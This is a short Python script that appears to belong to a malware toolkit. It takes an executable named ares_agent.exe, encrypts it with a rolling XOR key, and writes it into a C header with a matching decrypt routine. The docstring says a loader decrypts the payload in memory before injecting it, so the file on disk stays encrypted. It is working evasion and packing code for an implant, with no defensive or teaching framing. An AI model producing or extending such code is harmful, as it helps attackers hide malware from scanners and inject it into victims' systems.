#!/usr/bin/env python3
"""
gen_payload_blob.py — Embed ares_agent.exe as XOR-encrypted C byte array
The loader decrypts in-memory before injecting — payload on disk is encrypted.
Usage: python3 gen_payload_blob.py build/ares_agent.exe agent/native/ares_payload.h [--key 0xNN]
"""
import sys, os, argparse

parser = argparse.ArgumentParser()
parser.add_argument('input', help='Input PE file')
parser.add_argument('output', help='Output .h file')
parser.add_argument('--key', default='0x5E', help='XOR key for payload encryption (different from string key)')
args = parser.parse_args()

key = int(args.key, 16) if args.key.startswith('0x') else int(args.key)

with open(args.input, 'rb') as f:
    raw = f.read()

# Rolling XOR encrypt (same rolling scheme as ares_strings.h)
encrypted = bytearray()
for i, b in enumerate(raw):
    k = (key ^ ((i * 0x17 + 0x0B) & 0xFF)) & 0xFF
    encrypted.append(b ^ k)

sz = len(encrypted)
hexbytes = ', '.join(f'0x{b:02X}' for b in encrypted)

content = f"""/*
 * AUTO-GENERATED — DO NOT EDIT
 * Payload: {os.path.basename(args.input)} ({sz} bytes, XOR-encrypted key=0x{key:02X})
 * Decrypt with: k = (PLOAD_KEY ^ ((i*0x17+0x0B)&0xFF)) & 0xFF; buf[i] ^= k
 */
#ifndef ARES_PAYLOAD_H
#define ARES_PAYLOAD_H

#define PLOAD_KEY 0x{key:02X}U
#define PLOAD_LEN {sz}U

static const unsigned char ares_payload_enc[] = {{
    {hexbytes}
}};

static __inline void ares_decrypt_payload(unsigned char* out, const unsigned char* enc, unsigned int len) {{
    unsigned int i;
    for (i = 0; i < len; i++) {{
        unsigned char k = (unsigned char)((PLOAD_KEY ^ ((i * 0x17U + 0x0BU) & 0xFFU)) & 0xFFU);
        out[i] = enc[i] ^ k;
    }}
}}

#endif /* ARES_PAYLOAD_H */
"""

with open(args.output, 'w') as f:
    f.write(content)

print(f"[+] Generated {args.output} — {sz} bytes encrypted (key=0x{key:02X})")
